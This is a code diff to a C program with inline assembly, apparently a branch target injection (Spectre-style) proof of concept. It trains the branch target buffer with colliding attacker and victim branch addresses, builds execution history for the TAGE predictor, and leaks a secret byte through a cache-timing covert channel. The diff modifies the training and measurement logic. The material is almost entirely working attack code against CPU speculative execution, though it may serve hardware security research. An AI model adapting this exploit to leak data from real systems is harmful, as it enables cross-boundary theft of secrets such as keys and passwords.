@@ -32,6 +32,7 @@ uint8_t covert_channel[NUM_ELEMENTS * ELEMENT_PADDING];
 #define RET 0xC3
 
 char *secret = "L Lag gaye";
+char *dummy = "$$";
 
 void malicious_target();
  __asm__ (
@@ -64,7 +65,8 @@ asm (
 #define VICTIM_BRANCH_ADDRESS 0x41bababababf
 #define ATTACKER_BRANCH_ADDRESS 0x41aaba3a9ae2
 
-void continue_bti();
+void flush();
+void measure();
 /* The instructions are relocated at runtime to
  * addresses that collide in the BTB. The other
  * alternative would be to place them in an assembly file
@@ -76,7 +78,7 @@ asm (
   ".align 0x80000\n"
   "victim_insns:\n"
   "call *(%r11)\n"
-  NOPS_str(0x40)
+
   "ret\n"
   "victim_insns__end:\n"
 );
@@ -152,20 +154,30 @@ void do_bti_and_read_byte(char *secret_addr, char secret_value[2],
          * register RAX.
          */
         "mov (%[pointer_to_target]), %%r11\n"
-        "here:\n"
+        /* create some execution history for the TAGE predictions */
         "push %[label]\n"
         "push %[icall]\n"
+        "movl $1, %%r8d\n"
+        "jmp .L2\n"
+        ".L3:\n"
+        "addl $1, %%r8d\n"
+        ".L2:\n"
+        "cmpl $100, %%r8d\n"
+        "jle .L3\n"
         "ret\n"
         : /* No output operands */
         : [pointer_to_target] "r"(&pointer_to_target),
-          [leak_addr] "r"(secret_addr),
+          [leak_addr] "r"(training_sequence[i] == TRAIN ? dummy : secret_addr),
           [covert_channel] "r"(covert_channel),
-          [label] "r" (continue_bti),
-          [icall] "r" (training_sequence[i] == TRAIN ? ATTACKER_BRANCH_ADDRESS : VICTIM_BRANCH_ADDRESS)
+          [label] "r" (training_sequence[i] == TRAIN ? flush : measure),
+          [icall] "r" (training_sequence[i] == TRAIN ? VICTIM_BRANCH_ADDRESS : VICTIM_BRANCH_ADDRESS)
         : "rax", "rdi", "rsi", "r11", "rax");
-        asm("continue_bti:\n");
+        asm("flush:\n");
+        flush_covert_channel();
         continue;
     }
+
+    asm("measure:\n");
 
     for (int i = 0; i < NUM_ELEMENTS; i++) {
       uint64_t start, elapsed;
